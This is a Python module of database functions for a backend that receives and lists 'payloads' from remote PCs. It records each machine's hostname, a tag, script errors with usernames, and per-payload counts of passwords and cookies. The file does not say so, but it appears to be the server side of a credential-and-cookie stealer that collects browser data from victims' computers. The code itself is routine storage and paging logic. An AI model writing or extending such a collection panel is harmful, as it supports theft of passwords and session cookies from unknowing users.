import logging
from datetime import UTC, datetime
from typing import Any

from sqlalchemy import Integer, cast, or_

from app.config import ENVIRONMENT
from app.db import SessionLocal
from app.models import Payload, Pc, ScriptError

logger = logging.getLogger(__name__)


def sanitize_json_for_postgres(value: Any) -> Any:
    """Remove null bytes; PostgreSQL JSONB text cannot contain \\u0000."""
    if isinstance(value, str):
        if "\x00" not in value:
            return value
        return value.replace("\x00", "")
    if isinstance(value, dict):
        return {key: sanitize_json_for_postgres(item) for key, item in value.items()}
    if isinstance(value, list):
        return [sanitize_json_for_postgres(item) for item in value]
    return value


def parse_payload_datetime(payload: dict[str, Any]) -> datetime:
    executed_at = payload.get("executedAt")
    if isinstance(executed_at, str):
        try:
            return datetime.fromisoformat(executed_at.replace("Z", "+00:00"))
        except ValueError:
            pass
    return datetime.now(UTC)


def ensure_pc_registered(session, pc_name: str, environment: str) -> None:
    exists = (
        session.query(Pc.id)
        .filter(Pc.pc_name == pc_name, Pc.environment == environment)
        .first()
    )
    if not exists:
        session.add(Pc(pc_name=pc_name, environment=environment, tag=None))


def sync_pcs_from_payloads(session, environment: str | None = None) -> None:
    query = session.query(Payload.environment, Payload.pc_name).distinct()
    if environment:
        query = query.filter(Payload.environment == environment)
    for env, pc_name in query.all():
        ensure_pc_registered(session, pc_name, env)


def get_pc_tags(session, keys: list[tuple[str, str]]) -> dict[tuple[str, str], str | None]:
    if not keys:
        return {}
    conditions = [(Pc.environment == env) & (Pc.pc_name == name) for env, name in keys]
    rows = session.query(Pc).filter(or_(*conditions)).all()
    tags = {(row.environment, row.pc_name): row.tag for row in rows}
    return {key: tags.get(key) for key in keys}


def save_payload_record(payload: dict[str, Any]) -> dict[str, Any]:
    pc_name = str(payload.get("hostname") or "unknown")
    recorded_at = parse_payload_datetime(payload)
    content = sanitize_json_for_postgres(payload)

    with SessionLocal() as session:
        ensure_pc_registered(session, pc_name, ENVIRONMENT)
        row = Payload(
            environment=ENVIRONMENT,
            pc_name=pc_name,
            datetime=recorded_at,
            content=content,
        )
        session.add(row)
        session.commit()
        session.refresh(row)

    logger.info(
        "Saved payload id=%s environment=%s pc_name=%s",
        row.id,
        row.environment,
        row.pc_name,
    )
    return {
        "id": row.id,
        "environment": row.environment,
        "pc_name": row.pc_name,
        "datetime": row.datetime.isoformat(),
    }


def save_error_record(error_report: dict[str, Any]) -> dict[str, Any]:
    pc_name = str(error_report.get("hostname") or "unknown")
    recorded_at = parse_payload_datetime(error_report)
    content = sanitize_json_for_postgres(error_report)

    with SessionLocal() as session:
        ensure_pc_registered(session, pc_name, ENVIRONMENT)
        row = ScriptError(
            environment=ENVIRONMENT,
            pc_name=pc_name,
            datetime=recorded_at,
            content=content,
        )
        session.add(row)
        session.commit()
        session.refresh(row)

    logger.info(
        "Saved script error id=%s environment=%s pc_name=%s code=%s",
        row.id,
        row.environment,
        row.pc_name,
        error_report.get("code"),
    )
    return {
        "id": row.id,
        "environment": row.environment,
        "pc_name": row.pc_name,
        "datetime": row.datetime.isoformat(),
    }


def verify_database_connection() -> None:
    with SessionLocal() as session:
        session.connection()


def list_payloads(
    environment: str | None = None,
    pc_name: str | None = None,
    page: int = 1,
    page_size: int = 20,
) -> tuple[list[dict[str, Any]], int]:
    page = max(page, 1)
    page_size = max(min(page_size, 100), 1)

    password_count_expr = cast(Payload.content["passwordCount"].astext, Integer)
    cookie_count_expr = cast(Payload.content["cookieCount"].astext, Integer)

    with SessionLocal() as session:
        filters = []
        if environment:
            filters.append(Payload.environment == environment)
        if pc_name:
            filters.append(Payload.pc_name == pc_name)

        total = session.query(Payload.id).filter(*filters).count()

        rows = (
            session.query(
                Payload.id,
                Payload.environment,
                Payload.pc_name,
                Payload.datetime,
                password_count_expr.label("password_count"),
                cookie_count_expr.label("cookie_count"),
            )
            .filter(*filters)
            .order_by(Payload.datetime.desc())
            .offset((page - 1) * page_size)
            .limit(page_size)
            .all()
        )
        keys = [(row.environment, row.pc_name) for row in rows]
        tags = get_pc_tags(session, keys)
        items = [
            {
                "id": row.id,
                "environment": row.environment,
                "pc_name": row.pc_name,
                "tag": tags.get((row.environment, row.pc_name)),
                "datetime": row.datetime.isoformat(),
                "password_count": row.password_count or 0,
                "cookie_count": row.cookie_count or 0,
            }
            for row in rows
        ]
        return items, total


def get_payload_by_id(payload_id: int) -> dict[str, Any] | None:
    with SessionLocal() as session:
        row = session.get(Payload, payload_id)
        if row is None:
            return None
        return {
            "id": row.id,
            "environment": row.environment,
            "pc_name": row.pc_name,
            "datetime": row.datetime.isoformat(),
            "content": row.content,
        }


def list_distinct_environments() -> list[str]:
    with SessionLocal() as session:
        rows = session.query(Payload.environment).distinct().order_by(Payload.environment).all()
        return [row[0] for row in rows]


def list_distinct_pc_names(environment: str | None = None) -> list[str]:
    with SessionLocal() as session:
        query = session.query(Payload.pc_name).distinct()
        if environment:
            query = query.filter(Payload.environment == environment)
        rows = query.order_by(Payload.pc_name).all()
        return [row[0] for row in rows]


def list_pcs(
    environment: str | None = None,
    page: int = 1,
    page_size: int = 20,
) -> tuple[list[dict[str, Any]], int]:
    page = max(page, 1)
    page_size = max(min(page_size, 100), 1)

    with SessionLocal() as session:
        sync_pcs_from_payloads(session, environment)
        session.commit()

        query = session.query(Pc).order_by(Pc.pc_name.asc())
        if environment:
            query = query.filter(Pc.environment == environment)

        total = query.count()
        rows = query.offset((page - 1) * page_size).limit(page_size).all()
        items = [
            {
                "id": row.id,
                "environment": row.environment,
                "pc_name": row.pc_name,
                "tag": row.tag,
            }
            for row in rows
        ]
        return items, total


def update_pc_tag(pc_id: int, tag: str | None) -> dict[str, Any] | None:
    normalized = tag.strip() if tag else None
    if normalized == "":
        normalized = None

    with SessionLocal() as session:
        row = session.get(Pc, pc_id)
        if row is None:
            return None
        row.tag = normalized
        session.commit()
        session.refresh(row)
        return {
            "id": row.id,
            "environment": row.environment,
            "pc_name": row.pc_name,
            "tag": row.tag,
        }


def list_script_errors(
    environment: str | None = None,
    pc_name: str | None = None,
    page: int = 1,
    page_size: int = 20,
) -> tuple[list[dict[str, Any]], int]:
    page = max(page, 1)
    page_size = max(min(page_size, 100), 1)

    code_expr = cast(ScriptError.content["code"].astext, Integer)
    username_expr = ScriptError.content["username"].astext

    with SessionLocal() as session:
        filters = []
        if environment:
            filters.append(ScriptError.environment == environment)
        if pc_name:
            filters.append(ScriptError.pc_name == pc_name)

        total = session.query(ScriptError.id).filter(*filters).count()

        rows = (
            session.query(
                ScriptError.id,
                ScriptError.environment,
                ScriptError.pc_name,
                ScriptError.datetime,
                code_expr.label("code"),
                username_expr.label("username"),
            )
            .filter(*filters)
            .order_by(ScriptError.datetime.desc())
            .offset((page - 1) * page_size)
            .limit(page_size)
            .all()
        )

        keys = [(row.environment, row.pc_name) for row in rows]
        tags = get_pc_tags(session, keys)
        items = [
            {
                "id": row.id,
                "environment": row.environment,
                "pc_name": row.pc_name,
                "tag": tags.get((row.environment, row.pc_name)),
                "datetime": row.datetime.isoformat(),
                "code": row.code,
                "username": row.username,
            }
            for row in rows
        ]
        return items, total


def get_script_error_by_id(error_id: int) -> dict[str, Any] | None:
    with SessionLocal() as session:
        row = session.get(ScriptError, error_id)
        if row is None:
            return None
        return {
            "id": row.id,
            "environment": row.environment,
            "pc_name": row.pc_name,
            "datetime": row.datetime.isoformat(),
            "content": row.content,
        }


def list_error_filter_options(environment: str | None = None) -> dict[str, list[str]]:
    with SessionLocal() as session:
        environments = [
            row[0]
            for row in session.query(ScriptError.environment).distinct().order_by(ScriptError.environment).all()
        ]
        pc_query = session.query(ScriptError.pc_name).distinct()
        if environment:
            pc_query = pc_query.filter(ScriptError.environment == environment)
        pc_names = [row[0] for row in pc_query.order_by(ScriptError.pc_name).all()]
        return {
            "environments": environments,
            "pc_names": pc_names,
        }
